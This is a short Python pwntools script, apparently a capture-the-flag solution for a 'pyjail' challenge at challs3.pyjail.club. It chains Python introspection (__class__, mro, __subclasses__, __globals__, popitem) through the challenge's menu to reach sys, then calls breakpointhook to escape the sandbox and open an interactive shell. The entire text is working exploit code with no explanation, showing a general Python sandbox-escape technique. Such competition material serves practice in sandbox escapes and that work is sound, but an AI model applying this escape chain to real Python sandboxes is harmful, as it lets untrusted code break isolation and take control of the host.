from pwn import remote, process
# nc challs3.pyjail.club 8899
r = remote('challs3.pyjail.club', 8899)
# r = remote('localhost', 5000)

def getattr(attr):
    r.sendlineafter(b'choose > ', b'1')
    r.sendlineafter(b'attr > ', attr.encode())
    return r.recvline().strip()

def call():
    r.sendlineafter(b'choose > ', b'2')
    return r.recvline().strip()

for i in range(16):
    # get object subclasses
    getattr('__class__')
    getattr('mro')
    call()
    getattr('__reversed__')
    call()
    getattr('__next__')
    call()
    getattr('__subclasses__')
    call()

    # shim
    getattr('__reversed__')
    call()
    getattr('__next__')
    call()

    # pop globals
    getattr('__enter__')
    getattr('__globals__')

    if i == 15:
        # get sys
        getattr('values')
        call()
        getattr('__reversed__')
        call()
        getattr('__next__')
        call()
        break

    print(getattr('popitem'))
    call()

# breakpointhook, win
getattr('breakpointhook')
call()

r.interactive()
